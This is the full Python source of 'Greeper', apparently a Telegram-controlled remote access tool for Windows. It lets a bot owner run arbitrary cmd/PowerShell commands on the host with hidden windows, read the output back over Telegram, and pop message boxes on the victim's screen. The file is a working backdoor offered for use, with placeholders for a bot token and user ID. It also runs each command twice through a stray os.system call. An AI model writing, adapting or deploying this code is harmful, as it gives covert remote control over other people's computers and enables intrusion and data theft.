#GREEPER V1.1

import os
import subprocess as sp
try:import telebot
except:os.system("pip install telebot")

bot = telebot.TeleBot("YOUR_BOT_TOKEN")
user = "YOUR_USER_ID"

bot.send_message(user,"Greeper is online!\nSend /help for help")

@bot.message_handler(commands=["cmd"])
def cmd(msg):
    cmd = msg.text.partition(" ")[2]
    if cmd != "":
        try:
            if cmd.startswith("cd"):
                cmd = cmd.partition(" ")[2]
                if cmd == "":
                    bot.send_message(msg.chat.id, os.getcwd())
                else:
                    os.chdir(cmd)
                    bot.send_message(msg.chat.id, os.getcwd())
            else:
                os.system(cmd)
                result = sp.Popen(cmd, stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True,text=True, creationflags=sp.CREATE_NO_WINDOW)
                out, err = result.communicate()
                result.wait()
                if not err:
                    if out: bot.send_message(msg.chat.id, out)
                    else: bot.send_message(msg.chat.id, "Command executed sucessfully without Output!")
                else:
                    bot.send_message(msg.chat.id, err)
        except Exception as e:
            bot.send_message(msg.chat.id, "Some error occured!\n\n"+str(e))
    else:
        bot.send_message(msg.chat.id, "Parameter required!")

@bot.message_handler(commands=['terminate'])
def terminate(message):
    bot.send_message(user,"Greeper is offline!")
    bot.stop_polling()
    exit()

@bot.message_handler(commands=['msg'])
def msg(message):
    message_content = ' '.join(message.text.split()[1:]).replace("'", "''")
    if message_content == "":
        bot.reply_to(message,"Empty Message!")
        return
    ps_script = f"""
    Add-Type -AssemblyName System.Windows.Forms;
    Add-Type -AssemblyName System.Drawing;
    $form = New-Object System.Windows.Forms.Form;
    $form.Text = "MSG from Greeper";
    $form.TopMost = $true;
    $form.AutoSize = $true;
    $form.AutoSizeMode = [System.Windows.Forms.AutoSizeMode]::GrowAndShrink;
    $form.StartPosition = [System.Windows.Forms.FormStartPosition]::CenterScreen;
    $label = New-Object System.Windows.Forms.Label;
    $label.Text = '{message_content}';
    $label.AutoSize = $true;
    $label.MaximumSize = New-Object System.Drawing.Size(400, 0);  # Wider maximum width
    $label.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
    $label.Location = New-Object System.Drawing.Point(20, 20);
    $button = New-Object System.Windows.Forms.Button;
    $button.Text = "OK";
    $button.Font = New-Object System.Drawing.Font('Microsoft Sans Serif', 12, [System.Drawing.FontStyle]::Regular);
    $button.Size = New-Object System.Drawing.Size(100, 40);
    $button.Location = New-Object System.Drawing.Point(150, 80);
    $button.Add_Click({{ $form.Close() }});
    $form.Controls.Add($label);
    $form.Controls.Add($button);
    [void] $form.ShowDialog();
    """
    sp.Popen(['powershell', '-command', ps_script],creationflags=sp.CREATE_NO_WINDOW)
    bot.reply_to(message,"Message box displayed sucessfully")

@bot.message_handler(commands=['help'])
def help(message):
    bot.reply_to(message,"""
Commands:
                 
1. /cmd <command> - Execute cmd/ps commands
2. /msg <message to display> - displays msg box
3. /terminate - Terminate current session
4. /help - Displays this message
                 
Replace <> with parameters
Ex: /cmd dir
""")

bot.polling(non_stop=True)
